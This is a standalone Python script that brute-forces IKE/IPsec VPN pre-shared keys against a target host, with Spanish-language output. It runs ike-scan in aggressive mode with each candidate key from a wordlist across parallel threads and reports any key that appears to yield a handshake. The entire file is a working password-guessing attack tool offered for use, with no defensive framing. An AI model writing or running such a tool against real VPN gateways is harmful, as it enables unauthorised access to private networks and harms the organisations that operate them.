#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def run_ike_scan(ip, transform, psk):
    cmd = ["ike-scan", "-M", "-A", "--trans=" + transform, "--psk=" + psk, ip]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        output = result.stdout
        if "1 returned handshake" in output and "AUTHENTICATION-FAILED" not in output:
            return True, psk, output
        return False, psk, output
    except:
        return False, psk, "timeout"

def load_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-w", "--wordlist", required=True)
    parser.add_argument("--transform", default="5,2,1,2")
    parser.add_argument("--threads", type=int, default=5)
    parser.add_argument("--delay", type=float, default=0.5)
    args = parser.parse_args()

    psks = load_file(args.wordlist)
    total = len(psks)
    print(f"[+] Target: {args.target}")
    print(f"[+] Wordlist: {args.wordlist} ({total} PSKs)")
    print(f"[+] Hilos: {args.threads} | Delay: {args.delay}s\n")

    found = []
    completed = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(run_ike_scan, args.target, args.transform, psk): psk for psk in psks}

        for future in as_completed(futures):
            success, psk, output = future.result()
            completed += 1
            status = "VÁLIDA" if success else "inválida"
            print(f"[{completed:6d}/{total}] PSK: {psk:<20} → {status}")

            if success:
                found.append(psk)
                print("="*60)
                print(output.strip())
                print(f"[+] ¡PSK ENCONTRADA: {psk}!")
                print("="*60)

            time.sleep(args.delay)

    if found:
        print(f"\n[+] ¡ÉXITO! PSKs válidas: {len(found)}")
        for f in found:
            print(f"    → {f}")
    else:
        print(f"\n[!] Ninguna PSK encontrada en {total} intentos.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido.")
        sys.exit(0)
